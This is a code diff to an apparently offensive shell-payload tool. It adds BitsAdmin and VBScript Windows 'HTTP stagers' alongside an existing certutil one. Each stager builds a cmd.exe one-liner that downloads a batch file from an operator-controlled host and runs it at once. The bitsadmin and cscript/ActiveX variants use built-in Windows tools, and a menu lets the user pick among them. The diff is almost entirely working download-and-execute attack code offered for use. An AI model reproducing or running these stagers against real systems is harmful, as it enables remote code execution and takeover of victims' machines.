@@ -106,15 +106,45 @@ class Certutil_HTTP_Stager(HTTPStager):
         self.payload = """cmd.exe /c "certutil -urlcache -split -f http://{0}:{1}/{2} {2}.bat && cmd.exe /c {2}.bat" """.format(self.host,
                 self.port, filename)
 
+class BitsAdmin_HTTP_Stager(HTTPStager):
+    name = "BitsAdmin Windows HTTP Stager"
+    def __init__(self, conn_info, args, filename):
+        self.args = args
+        self.host = conn_info[0]
+        self.port = conn_info[1]
+        self.payload = """cmd.exe /c "bitsadmin.exe /transfer {0} /download /priority normal http://{1}:{2}/{3} %Temp%\\{3}.bat && cmd.exe /c %Temp%\\{3}.bat" """.format(generate_file_name(), self.host,
+            self.port, filename)
+
+class VBScript_HTTP_Stager(HTTPStager):
+    name = "VBScript Windows HTTP Stager"
+    def __init__(self, conn_info, args, filename):
+        self.args = args
+        self.host = conn_info[0]
+        self.port = conn_info[1]
+        self.payload = """cmd.exe /c "echo var H = new ActiveXObject("WinHttp.WinHttpRequest.5.1");H.Open("GET", "http://{0}:{1}/{2}", /*async=*/false);H.Send();B = new ActiveXObject("ADODB.Stream");B.Type = 1;B.Open();B.Write(H.ResponseBody);B.SaveToFile("{2}.bat");S = new ActiveXObject("Wscript.Shell");S.run("{2}.bat");" > {2}.js && cmd.exe /c "cscript {2}.js" """.format(self.host, self.port, filename)
 
 def choose_stager(stagers):
     """
     Present a choice between an array of stagers.
     @zc00l
     """
+    
+    # This code snippet is to re-order stager list in a way that
+    # it will not give me any trouble wth indexing, and still 
+    # let me to be flexible about banning some staging options
+    # from the shells.
+    new_list = []
+    i = 1
+    for stager in stagers:
+        new_list.insert(i-1, (i, stager[1]) )
+        i += 1
+    stagers = new_list
+
     print(info("Choose a stager: "))
+
     for stager in stagers:
         print("\033[093m%d\033[0m. ".ljust(3) % stager[0] + "%s" % stager[1].name)
+        i += 1
     n = int(raw_input(info("Stager number: ")), 10) # decimal
     if n > len(stagers) or n < 1:
         print(error("You cant choose a stager option number higher than the maximum amount of available stagers. Setting it to 1."))
@@ -136,4 +166,6 @@ LINUX_STAGERS = [
 WINDOWS_STAGERS = [
     (1, Powershell_HTTP_Stager),
     (2, Certutil_HTTP_Stager),
+    (3, BitsAdmin_HTTP_Stager),
+    (4, VBScript_HTTP_Stager)
 ]
